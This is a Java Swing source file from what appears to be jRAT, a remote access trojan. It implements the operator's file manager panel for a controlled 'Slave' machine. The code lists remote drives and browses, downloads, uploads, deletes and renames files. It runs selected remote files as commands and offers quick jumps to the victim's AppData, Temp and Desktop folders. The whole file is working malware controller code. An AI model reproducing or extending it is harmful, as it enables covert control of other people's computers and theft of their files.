package jrat.module.fs.ui;

import iconlib.FileIconUtils;
import jrat.api.Resources;
import jrat.common.DropLocations;
import jrat.common.Logger;
import jrat.common.io.FileCache;
import jrat.common.io.TransferData;
import jrat.controller.Drive;
import jrat.controller.Slave;
import jrat.controller.io.FileObject;
import jrat.controller.listeners.DirListener;
import jrat.controller.packets.outgoing.*;
import jrat.controller.utils.Utils;
import jrat.module.fs.FileSystem;
import jrat.module.fs.packets.Packet15ListFiles;
import jrat.module.fs.packets.download.Packet21Download;
import jrat.module.fs.packets.upload.Packet42Upload;
import jrat.module.fs.packets.Packet47RenameFile;
import jrat.module.fs.ui.previews.PanelPreviewArchive;
import jrat.module.fs.ui.previews.PanelPreviewFile;
import jrat.module.fs.ui.previews.PanelPreviewImage;
import jrat.module.fs.ui.previews.PreviewPanel;
import oslib.OperatingSystem;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

@SuppressWarnings("serial")
public class PanelFileManager extends FileSubPanel {

    private final LocalFileTable localTable;
	private final RemoteFileTable remoteTable;

	public PanelFileManager(Slave slave) {
		super(slave, "Files", Resources.getIcon("folder-stand"));

		setLayout(new BorderLayout(0, 0));
		
		final JSplitPane sp = new JSplitPane();
		
		localTable = new LocalFileTable();
		sp.setLeftComponent(localTable);
		
		remoteTable = new RemoteFileTable();
		sp.setRightComponent(remoteTable);
		
		add(sp, BorderLayout.CENTER);
		
		SwingUtilities.invokeLater(new Runnable() {
			@Override
			public void run() {
				sp.setDividerLocation(0.5D);
			}
		});
	}

	public class LocalFileTable extends FileTable {
		
		public LocalFileTable() {	
			super();
			driveComboBox.setRenderer(renderer);
			driveComboBox.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					clear();
					FileSystem.addDir(driveComboBox.getSelectedItem().toString(), LocalFileTable.this);
				}
			});
			
			listRoots();
			
			JButton btnUpload = new JButton("upload");
			btnUpload.setIcon(Resources.getIcon("arrow-up"));
			btnUpload.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent arg0) {
					upload();
				}				
			});
			toolBar.add(btnUpload, 0);
		}

		@Override
		public void onBack() {
			if (!getCurrentDirectory().contains(File.separator)) {
				clear();
				setDirectory(null);
				listRoots();
			} else {
				clear();
				setDirectory(getCurrentDirectory().substring(0, getCurrentDirectory().substring(0, getCurrentDirectory().length() - 1).lastIndexOf(File.separator)));
				FileSystem.addDir(getCurrentDirectory(), this);
			}
		}

		@Override
		public void onReload() {
			clear();
			
			if (getCurrentDirectory().length() == 0) {	
				listRoots();
			} else {
				FileSystem.addDir(getCurrentDirectory(), this);
			}
		}

		@Override
		public void onDelete() {
			FileObject[] files = getSelectedItems();
			if (files != null) {
				for (FileObject file : files) {
					if (Utils.yesNo("Confirm", "Confirm deleting " + file)) {
						new File(file.getPath()).delete();
					}
				}
			}
		}

		@Override
		public void onCreateFolder() {
			String foldername = JOptionPane.showInputDialog(null, "Input name of folder to create", "New Folder", JOptionPane.QUESTION_MESSAGE);
			if (foldername == null) {
				return;
			}
			foldername = foldername.trim();
			new File(getCurrentDirectory() + File.separator + foldername).mkdirs();
		}

		@Override
		public void onItemClick(FileObject fo) {
			if (fo.isDirectory()) {
				browse(fo.getPath());
			} else {
				try {
					Desktop.getDesktop().open(new File(fo.getPath()));
				} catch (Exception e1) {
					e1.printStackTrace();
				}
			}
		}
		
		@Override
		public void setDirectory(String directory) {
			if (!directory.endsWith(File.separator)) {
				directory += File.separator;
			}
			
			super.setDirectory(directory);
		}
		
		public void listRoots() {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				File[] f = File.listRoots();
				driveComboModel.removeAllElements();
				for (File fi : f) {		
					super.renderer.addIcon(fi.getAbsolutePath(), FileIconUtils.getIconFromFile(fi));
					driveComboModel.addElement(fi.getAbsolutePath());
				}
			} else {
				browse("/");
			}
		}
		
		public void browse(String dir) {
			setDirectory(dir);
			clear();
			FileSystem.addDir(dir, this);
		}
		
		public void upload() {
			for (FileObject s : getSelectedItems()) {
				File file = new File(s.getPath());
				slave.addToSendQueue(new Packet42Upload(file, remoteTable.getCurrentDirectory() + file.getName()));
			}
			
			if (getSelectedItems().length > 0) {
				getParentPanel().setTab(PanelFileTransfers.instance);
			}
		}

        public void onSelect(String directory) {
            browse(directory);
        }
	}
	
	public class RemoteFileTable extends FileTable {

		public RemoteFileTable() {
			super(slave);
			for (Drive drive : slave.getDrives()) {
				driveComboModel.addElement(drive.getName());
				renderer.addIcon(drive.getName(), Resources.getIcon("drive"));
			}
			driveComboBox.setRenderer(renderer);
			
			driveComboBox.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					clear();
					slave.addToSendQueue(new Packet15ListFiles(driveComboBox.getSelectedItem().toString()));
				}
			});
						
			JButton btnDownload = new JButton("Download");
			btnDownload.setIcon(Resources.getIcon("arrow-down"));
			btnDownload.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent arg0) {
					download();
				}				
			});
			toolBar.add(btnDownload, 0);

			JButton btnSearch = new JButton();
			btnSearch.setIcon(Resources.getIcon("search"));
			btnSearch.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent actionEvent) {
				    PanelFileSystem parent = getParentPanel();
                    parent.getSearchPanel().setSearchRoot(getCurrentDirectory());
					parent.setTab(parent.getSearchPanel());
				}
			});

			toolBar.add(btnSearch, 1);

			JPopupMenu popupMenuRemote = new JPopupMenu();
			addPopup(popupMenuRemote);

			JMenuItem mntmRun = new JMenuItem("Run");
			mntmRun.setIcon(Resources.getIcon("execute"));
			mntmRun.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent arg0) {
					FileObject[] files = getSelectedItems();
					if (files != null) {
						for (FileObject file : files) {
							slave.addToSendQueue(new Packet38RunCommand(file.getPath()));
						}
					}
				}
			});

			JMenu mnQuickJump = new JMenu("Quick Jump");
			mnQuickJump.setIcon(Resources.getIcon("folder-shortcut"));
			popupMenuRemote.add(mnQuickJump);

			popupMenuRemote.addSeparator();

			JMenuItem mnUserHome = new JMenuItem("User home");
			mnQuickJump.add(mnUserHome);
			mnUserHome.addActionListener(new DirListener(slave, DropLocations.HOME));

			JMenuItem mnDrives = new JMenuItem("Drives");
			mnQuickJump.add(mnDrives);
			mnDrives.addActionListener(new DirListener(slave, DropLocations.ROOT));

			JMenuItem mnAppdata = new JMenuItem("Appdata");
			mnQuickJump.add(mnAppdata);
			mnAppdata.addActionListener(new DirListener(slave, DropLocations.APPDATA));

			JMenuItem mnTemp = new JMenuItem("Temp");
			mnQuickJump.add(mnTemp);
			mnTemp.addActionListener(new DirListener(slave, DropLocations.TEMP));

			JMenuItem mnDesktop = new JMenuItem("Desktop");
			mnQuickJump.add(mnDesktop);
			mnDesktop.addActionListener(new DirListener(slave, DropLocations.DESKTOP));

			popupMenuRemote.add(mntmRun);

			JMenuItem mntmPreviewFiletext = new JMenuItem("PreviewPanel file (Text, ZIP, Image)");
			mntmPreviewFiletext.setIcon(Resources.getIcon("preview"));
			mntmPreviewFiletext.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent arg0) {
					preview();
				}
			});

			popupMenuRemote.add(mntmPreviewFiletext);

			JMenuItem mntmDownloadFile = new JMenuItem("Download File(s)");
			mntmDownloadFile.setIcon(Resources.getIcon("arrow-left"));
			mntmDownloadFile.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					download();
				}
			});
			popupMenuRemote.add(mntmDownloadFile);

			JMenuItem mntmExploreImages = new JMenuItem("Explore(.png, .jpg, .gif)");
			mntmExploreImages.setIcon(Resources.getIcon("images-stack"));
			mntmExploreImages.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					List<String> files = new ArrayList<>();
										
					for (FileObject fo : getSelectedItems()) {
						String path = fo.getPath();
						if (path.endsWith(".png") || path.endsWith(".gif") || path.endsWith(".jpg") || path.endsWith(".jpeg")) {
							files.add(path);
						}
					}

					if (files.size() > 0) {
						String[] paths = new String[files.size()];
						for (int i = 0; i < files.size(); i++) {
							paths[i] = files.get(i);
						}

						PanelFileSystem parent = getParentPanel();

						parent.getThumbPanel().reload(paths);
						parent.setTab(parent.getThumbPanel());
					}
				}
			});
			popupMenuRemote.add(mntmExploreImages);

			popupMenuRemote.addSeparator();

			JMenuItem mntmNewFolder = new JMenuItem("New Folder");
			mntmNewFolder.setIcon(Resources.getIcon("folder-add"));
			mntmNewFolder.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					String foldername = JOptionPane.showInputDialog(null, "Input name of folder to create", "New Folder", JOptionPane.QUESTION_MESSAGE);
					if (foldername == null) {
						return;
					}
					foldername = foldername.trim();
					slave.addToSendQueue(new Packet43CreateDirectory(getCurrentDirectory(), foldername));
				}
			});
			popupMenuRemote.add(mntmNewFolder);

			JMenuItem mntmDelete = new JMenuItem("Delete");
			mntmDelete.setIcon(Resources.getIcon("delete"));
			mntmDelete.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					onDelete();
				}
			});
			popupMenuRemote.add(mntmDelete);

			JMenuItem mntmRename = new JMenuItem("Rename");
			mntmRename.setIcon(Resources.getIcon("rename"));
			mntmRename.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					FileObject file = getSelectedItem();
					if (file != null) {
						String result = JOptionPane.showInputDialog(null, "Input new file name", "Rename", JOptionPane.QUESTION_MESSAGE);
						if (result == null) {
							return;
						}
						slave.addToSendQueue(new Packet47RenameFile(file.getPath(), result.trim()));
					}
				}
			});
            popupMenuRemote.add(mntmRename);

			popupMenuRemote.addSeparator();

			JMenuItem mntmSelectAllFolders = new JMenuItem("Select all folders");
			mntmSelectAllFolders.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					int row = 0;
					for (int i = 0; i < getTableModel().getRowCount(); i++) {
						String val = getTableModel().getValueAt(i, 0).toString();
						if (val.substring(val.lastIndexOf(slave.getFileSeparator()), val.length()).contains(".")) {
							row = i - 1;
							break;
						}
					}
					table.getSelectionModel().setSelectionInterval(0, row);
				}
			});
			mntmSelectAllFolders.setIcon(Resources.getIcon("folders-stack"));
			popupMenuRemote.add(mntmSelectAllFolders);

			JMenuItem mntmSelectAllFiles = new JMenuItem("Select all files");
			mntmSelectAllFiles.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent e) {
					int row = 0;
					for (int i = 0; i < getTableModel().getRowCount(); i++) {
						String val = getTableModel().getValueAt(i, 0).toString();
						if (val.substring(val.lastIndexOf(slave.getFileSeparator()), val.length()).contains(".")) {
							row = i - 1;
							break;
						}
					}
					table.getSelectionModel().setSelectionInterval(row, getTableModel().getRowCount());
				}
			});
			mntmSelectAllFiles.setIcon(Resources.getIcon("documents-stack"));
			popupMenuRemote.add(mntmSelectAllFiles);

			popupMenuRemote.addSeparator();

			JMenuItem mntmRefresh = new JMenuItem("Refresh");
			mntmRefresh.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					while (getTableModel().getRowCount() > 0) {
						getTableModel().removeRow(0);
					}
					slave.addToSendQueue(new Packet15ListFiles(getCurrentDirectory()));
				}
			});
			mntmRefresh.setIcon(Resources.getIcon("refresh"));
			popupMenuRemote.add(mntmRefresh);
		}

        /**
         * Summon file previewing of current selected files
         */
		private void preview() {
            FileObject[] files = getSelectedItems();
            if (files != null) {
                for (FileObject fo : files) {
                    String file = fo.getPath();
                    String extension = file.toLowerCase().substring(file.lastIndexOf("."));

                    PreviewPanel preview = null;

                    switch (extension) {
                        case ".png":
                        case ".jpg":
                        case ".jpeg":
                        case ".gif":
                            preview = new PanelPreviewImage(slave, file);
                            break;
                        case ".zip":
                        case ".jar":
                            preview = new PanelPreviewArchive(slave, file);
                            break;
                        default:
                            preview = new PanelPreviewFile(slave, file);
                            break;
                    }

                    getParentPanel().addPreview(file, preview);
                }
            }
        }

		@Override
		public void onBack() {
			clear();
			
			if (!getCurrentDirectory().contains(slave.getFileSeparator())) {
				setDirectory(null);
			} else {
				setDirectory(getCurrentDirectory().substring(0, getCurrentDirectory().substring(0, getCurrentDirectory().length() - 1).lastIndexOf(slave.getFileSeparator())));
			}
		}

		@Override
		public void onReload() {
			clear();
			slave.addToSendQueue(new Packet15ListFiles(getCurrentDirectory()));
		}

		@Override
		public void onDelete() {
			FileObject[] files = getSelectedItems();
			for (FileObject file : files) {
				if (Utils.yesNo("Confirm", "Confirm deleting " + file.getPath())) {
					slave.addToSendQueue(new Packet16DeleteFile(file.getPath()));
				}
			}
		}

		@Override
		public void onCreateFolder() {
			String foldername = JOptionPane.showInputDialog(null, "Input name of folder to create", "New Folder", JOptionPane.QUESTION_MESSAGE);
			if (foldername == null) {
				return;
			}
			foldername = foldername.trim();
			slave.addToSendQueue(new Packet43CreateDirectory(getCurrentDirectory(), foldername));
		}

		@Override
		public void onItemClick(FileObject fo) {
			if (fo.isDirectory()) {
				clear();
				setDirectory(fo.getPath());
			}
		}
		
		@Override
		public void setDirectory(String directory) {
			if (directory == null) {
				directory = "";
			}
			
			String c = slave.getFileSeparator();

			if (!directory.endsWith(c)) {
				directory += c;
			}
			
			slave.addToSendQueue(new Packet15ListFiles(directory));
			super.setDirectory(directory);
		}

        /**
         * Downloads the selected files from the remote machine
         *
         * 1. checks if current local folder user is viewing is writable, saves there
         * 2. asks user to pick a folder to dump multiple files in, or to pick a file to download to
         * 3. will warn and break if permission denied
         */
		public void download() {
		    FileObject[] files = getSelectedItems();

			File f = new File(localTable.getCurrentDirectory());

			if (!f.isDirectory() || !f.canWrite()) {
                JFileChooser picker = new JFileChooser();

                if (files.length > 1) {
                    picker.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
                }

                picker.showSaveDialog(null);

                f = picker.getSelectedFile();

                if (f == null) {
                    return;
                }
            }
			

            for (FileObject fo : files) {
                TransferData data = new TransferData();

                String filename = f.isFile() ? f.getName() : fo.getPath().substring(fo.getPath().lastIndexOf(slave.getFileSeparator()) + 1, fo.getPath().length());

                File local = new File(f.isDirectory() ? f : f.getParentFile(), filename);

                if (local.exists() && !local.canWrite()) {
                    Logger.err("permission denied on " + local.getAbsolutePath());
                    break;
                }

                data.setLocalFile(local);

                PanelFileTransfers.instance.add(data);
                FileCache.put(fo.getPath(), data);
                slave.addToSendQueue(new Packet21Download(fo.getPath()));
                getParentPanel().setTab(PanelFileTransfers.instance);
            }
		}

        public void onSelect(String directory) {
            setDirectory(directory);
        }
    }

	public RemoteFileTable getRemoteTable() {
		return remoteTable;
	}

    @Override
    public void opened() {
        remoteTable.setDirectory(null);
    }
}
